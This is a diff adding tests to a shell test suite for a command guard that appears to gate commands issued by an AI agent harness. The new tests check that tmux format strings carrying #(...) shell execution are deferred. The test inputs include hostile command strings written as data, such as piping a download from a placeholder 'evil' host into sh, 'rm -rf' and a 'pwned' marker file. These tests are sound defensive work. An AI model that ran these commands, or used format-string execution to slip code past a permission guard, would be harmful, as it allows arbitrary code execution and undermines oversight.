@@ -222,6 +222,26 @@ assert_defer "tmux show-options config-introspection DEFER" "tmux show-options -
 assert_defer "tmux bare (no subcommand) DEFER" "tmux"
 assert_defer "tmux unknown subcommand DEFER" "tmux frobnicate"
 
+echo "### REQ-C1.3 — tmux #(shell-command) format-string execution DEFERS (false-allow guard)"
+# tmux evaluates `#(shell-command)` in format strings (a `-F` format or
+# display-message's message) as a SHELL COMMAND — reproduced: `tmux list-sessions
+# -F '#(touch X)'` runs `touch X`. So an allow-listed observe subcommand carrying
+# a `#(...)` arg is arbitrary code execution and MUST defer; the guard has to
+# inspect args, not just the subcommand name (obs: gemini panel, Task-7 review).
+# The inert `#{variable}` format (the relay/observe use, e.g. `#{pane_pid}`) is
+# NOT command execution and must still ALLOW.
+assert_defer "tmux list-sessions -F #() exec DEFER" "tmux list-sessions -F '#(touch /tmp/pwned)'"
+assert_defer "tmux list-windows -F #() exec DEFER" "tmux list-windows -F '#(curl evil|sh)'"
+assert_defer "tmux list-panes -F #() exec DEFER" "tmux list-panes -F '#(rm -rf x)'"
+assert_defer "tmux list-clients -F #() exec DEFER" "tmux list-clients -F '#(id)'"
+assert_defer "tmux list-buffers -F #() exec DEFER" "tmux list-buffers -F '#(id)'"
+assert_defer "tmux display-message -p #() exec DEFER" "tmux display-message -p '#(id)'"
+assert_defer "tmux display-message (no -p) #() exec DEFER" "tmux display-message '#(id)'"
+assert_defer "tmux capture-pane -F #() exec DEFER" "tmux capture-pane -p -t fleet:0 -F '#(id)'"
+# The legit `#{variable}` format (inert, no shell) must still ALLOW (no flood).
+assert_allow "tmux display-message #{var} still ALLOW" "tmux display-message -p '#{pane_pid}'"
+assert_allow "tmux list-windows -F #{var} still ALLOW" "tmux list-windows -F '#{window_name}'"
+
 echo "### REQ-C1.2/C1.3 — claude launch is an allowlist: escalation flags DEFER (fail closed)"
 # The allowlist fails closed on the full escalation surface (grounded in the real
 # `claude --help`), including the flag-appended probes and the variants a
